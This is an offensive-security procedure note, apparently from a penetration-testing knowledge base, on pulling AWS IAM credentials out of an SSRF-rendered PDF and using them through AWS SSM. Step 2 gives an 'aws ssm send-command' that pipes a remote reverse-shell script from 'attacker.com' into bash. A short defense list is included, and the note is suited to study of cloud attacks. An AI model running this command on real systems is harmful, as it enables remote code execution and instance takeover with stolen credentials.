---
tags:
  - credential-exposure
  - ssrf
  - data-exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-inject-ssrf-iframe]]'
  - '[[commands/aws-ssm-send-command]]'
platforms:
  - AWS
techniques:
  - '[[Unsecured Credentials]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Credentials in Files]]'
id: 55d2f9eb-a998-45de-8f10-3a3dc02e4f5a
created_at: '2025-12-11T06:10:22.557Z'
updated_at: '2025-12-11T06:10:22.557Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1552]]'
---
# Extract AWS Credentials from Generated PDF

## Summary

This procedure involves retrieving and utilizing exposed AWS credentials from the SSRF-generated PDF, potentially leading to further attacks like arbitrary command execution.

## Description

After successful SSRF, the PDF embeds AWS instance metadata, including IAM credentials. These can be extracted and used with AWS CLI commands to manipulate resources, such as executing shell commands via SSM.

## Requirements

1. Successfully generated PDF with embedded metadata.
2. AWS CLI configured with extracted credentials.
3. Target AWS resources accessible via the credentials.

## Defense

Defensive measures and detection strategies:

- Disable or restrict access to instance metadata service.
- Use least-privilege IAM roles for EC2 instances.
- Monitor AWS API calls for suspicious activity.

## Objectives

1. Extract sensitive credentials from PDF.
2. Demonstrate impact through potential command execution.
3. Assess full compromise scope.

## Instructions

### Step 1: Inspect PDF for Credentials

**Context**: Open the PDF and locate embedded metadata content.

> Look for keys like AccessKeyId, SecretAccessKey, and Token.

### Step 2: Utilize Credentials for Further Exploitation

**Context**: Use extracted credentials to execute commands via AWS SSM.

**Command** ([[commands/aws-ssm-send-command]]):
```bash
aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl http://attacker.com/reverse-shell.sh | bash"]'
```

> This executes arbitrary shell commands on target instances.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques

- [[Credentials in Files]]

## Commands Used

- [[commands/aws-ssm-send-command]]

## Tools Used



## Tags

- [[credential-exposure]]
- [[data-exfiltration]]
